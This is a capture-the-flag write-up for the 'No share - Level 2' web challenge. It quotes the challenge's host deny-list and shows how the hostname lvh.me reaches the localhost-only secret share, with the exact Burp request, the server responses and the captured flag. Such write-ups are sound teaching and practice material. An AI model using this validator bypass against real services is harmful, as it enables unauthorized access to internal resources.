# No share - Level 2
## Introduction
After the first breach of their file sharing system, our enemies have strengthened their defenses. This enhanced file sharing system now includes further validation mechanisms to prevent unauthorized access to their secret vault.
```python
def deny(share):
     return 'secret.pacman' in share.lower() or 'localhost' in share or '1' in share or ':' in share
```
## Challenge Resolution
This time we cannot play around with the double encoding, but the `secret.pacman` share is still linked to the `localhost`:
```http
HTTP/1.1 200 OK
Content-Length: 89
Content-Type: application/json
Date: Fri, 30 Jan 2026 16:32:02 GMT
Server: gunicorn

[{"host":"public.pacman","ip":"172.45.16.23"},{"host":"secret.pacman","ip":"127.0.0.1"}]
```
Unfortunately, `localhost` and `127.0.0.1:<PORT>` are not usable due to the **blacklist**. Nonetheless, there another way to refer to the localhost, with the name: **`lvh.me`**
We test with `Burp Repeater` and it works:
```http
GET /api/folder?path=%2F&share=lvh.me HTTP/1.1
Host: noshare2.web01.jeanne-hack-ctf.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: http://noshare2.web01.jeanne-hack-ctf.org/
Connection: keep-alive
X-PwnFox-Color: pink
Priority: u=0
```
With this request, we get the following **response**:
```http
HTTP/1.1 200 OK
Content-Length: 37
Content-Type: application/json
Date: Fri, 30 Jan 2026 16:45:09 GMT
Server: gunicorn

[{"name":"Secrets","type":"folder"}]
```
Using `match and replace` with Burp Proxy, we can now navigate through the `secret.pacman` share and find the flag:
```flag
JDHACK{v4l1d4t0rs_c4n_b3_byp4ss3d}
```

